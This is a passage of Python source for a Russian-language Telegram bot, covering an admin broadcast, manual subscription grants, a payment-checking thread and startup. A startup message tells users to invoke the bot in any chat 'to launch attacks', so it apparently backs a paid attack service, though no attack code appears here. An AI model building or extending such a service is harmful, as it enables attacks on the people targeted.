    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM users')
    users = cursor.fetchall()
    conn.close()
    
    sent = 0
    failed = 0
    
    for user in users:
        try:
            bot.send_message(user[0], f"📢 <b>Сообщение от администратора:</b>\n\n{message.text}")
            sent += 1
            time.sleep(0.05)
        except:
            failed += 1
    
    bot.send_message(
        message.chat.id,
        f"✅ <b>Рассылка завершена</b>\n\n"
        f"Отправлено: <b>{sent}</b>\n"
        f"Не отправлено: <b>{failed}</b>",
        reply_markup=admin_menu()
    )

def process_add_sub(message):
    if message.text == '🔙 Назад':
        bot.send_message(message.chat.id, "Отменено", reply_markup=admin_menu())
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            raise ValueError
        
        user_id = int(parts[0])
        sub_type = parts[1]
        
        if sub_type not in ['7days', '30days', 'forever']:
            raise ValueError
        
        update_subscription(user_id, sub_type)
        
        bot.send_message(
            message.chat.id,
            f"✅ <b>Подписка выдана</b>\n\n"
            f"Пользователь: <code>{user_id}</code>\n"
            f"Срок: <b>{sub_type}</b>",
            reply_markup=admin_menu()
        )
        
        # Уведомляем пользователя
        try:
            bot.send_message(
                user_id,
                f"🎁 <b>Вам выдана подписка!</b>\n\n"
                f"Тип: <b>{sub_type}</b>\n"
                f"Срок: до окончания периода\n\n"
                f"Теперь вы можете использовать бота."
            )
        except:
            pass
            
    except:
        bot.send_message(
            message.chat.id,
            "❌ <b>Ошибка</b>\n\n"
            "Неверный формат. Пример: <code>123456789 30days</code>",
            reply_markup=admin_menu()
        )

# ==================== ЗАПУСК ====================
def payment_checker():
    """Проверка платежей в фоне"""
    while True:
        try:
            conn = sqlite3.connect(DATABASE_NAME)
            cursor = conn.cursor()
            
            cursor.execute('SELECT invoice_id, user_id, subscription_type FROM payments WHERE status = "pending"')
            pending = cursor.fetchall()
            
            for invoice_id, user_id, sub_type in pending:
                status = check_payment(invoice_id)
                
                if status == 'paid':
                    update_subscription(user_id, sub_type)
                    cursor.execute('UPDATE payments SET status = ? WHERE invoice_id = ?', ('paid', invoice_id))
                    
                    try:
                        bot.send_message(
                            user_id,
                            "✅ <b>Оплата подтверждена!</b>\n\n"
                            "Ваша подписка активирована. Теперь можно использовать бота."
                        )
                    except:
                        pass
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"Ошибка проверки платежей: {e}")
        
        time.sleep(60)

if __name__ == '__main__':
    init_database()
    
    # Включаем inline режим
    print(f"Бот запущен! Имя бота для inline режима: @{bot.get_me().username}")
    print(f"Используйте @{bot.get_me().username} в любом чате для запуска атак!")
    
    # Запуск проверки платежей
    checker = threading.Thread(target=payment_checker, daemon=True)
    checker.start()
    
    logger.info("Бот запущен")
    print("Бот запущен и готов к работе!")
    
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logger.error(f"Ошибка бота: {e}")